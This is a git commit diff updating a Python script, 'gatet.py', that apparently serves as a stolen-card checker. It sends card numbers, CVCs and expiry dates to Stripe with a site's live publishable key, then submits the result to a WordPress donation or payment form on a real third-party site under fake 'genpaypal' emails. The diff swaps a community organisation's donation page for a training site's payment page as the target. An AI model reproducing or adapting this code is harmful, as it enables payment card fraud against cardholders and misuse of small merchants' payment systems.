2c3cc0084a8b222c6ca70f896cc45bd153678099
Rodamuser08 <rodamuser08@gmail.com>
2025-08-17 09:32:12 +0700

    Update gatet.py

--- gatet.py
+++ gatet.py
@@ -33,19 +33,19 @@ def Tele(ccx):
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
 	}
 	
-	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F399197339e%3B+stripe-js-v3%2F399197339e%3B+card-element&key=pk_live_51LqLrcKuYyCGsqVmBqB3jxUQeCs9GCzZG82Y0qXBJdE6WyvpXeKTBGpJ0xv0ObkWN98nTCwHInf77IpJv5Ka1ZEk00zcyPxtd9'
+	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F399197339e%3B+stripe-js-v3%2F399197339e%3B+card-element&key=pk_live_51HhzZKHEsfbXPUvQKw79kMARq3HSfmURGvLtWi0HKY8tEQm6R610k0HxpM4EH025FYbzOeVOThqIpKo1MNHAeIsH00ewKzPMQ8'
 	
 	response = session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
 	
 	pm = response.json()['id']
 	
 	headers = {
-	    'authority': 'mauritaniancommunity-dmv-usa.org',
+	    'authority': 'islandtraining.ie',
 	    'accept': 'application/json, text/javascript, */*; q=0.01',
 	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
 	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-	    'origin': 'https://mauritaniancommunity-dmv-usa.org',
-	    'referer': 'https://mauritaniancommunity-dmv-usa.org/membership-donations/',
+	    'origin': 'https://islandtraining.ie',
+	    'referer': 'https://islandtraining.ie/pay/',
 	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
@@ -57,22 +57,20 @@ def Tele(ccx):
 	}
 	
 	data = {
-	    'action': 'wp_full_stripe_inline_donation_charge',
-	    'wpfs-form-name': 'Dmv',
-	    'wpfs-form-get-parameters': '%7B%7D',
-	    'wpfs-custom-amount': 'other',
+	    'action': 'wp_full_stripe_inline_payment_charge',
+	    'wpfs-form-name': 'Pay',
 	    'wpfs-custom-amount-unique': '1',
-	    'wpfs-donation-frequency': 'one-time',
+	    'wpfs-card-holder-name': '',
 	    'wpfs-card-holder-email': f'genpaypal{random_amount2}@gmail.com',
-	    'wpfs-card-holder-name': 'Gen Paypal',
+	    'wpfs-custom-input[]': [
+	        '',
+	        '',
+	        '',
+	    ],
 	    'wpfs-stripe-payment-method-id': f'{pm}',
 	}
 	
-	response = session.post(
-	    'https://mauritaniancommunity-dmv-usa.org/wp-admin/admin-ajax.php',
-	    headers=headers,
-	    data=data,
-	)
+	response = session.post('https://islandtraining.ie/wp-admin/admin-ajax.php', headers=headers, data=data)
 	
 	try:
 		result = re.search(r'"message":"(.*?)"', response.text).group(1)
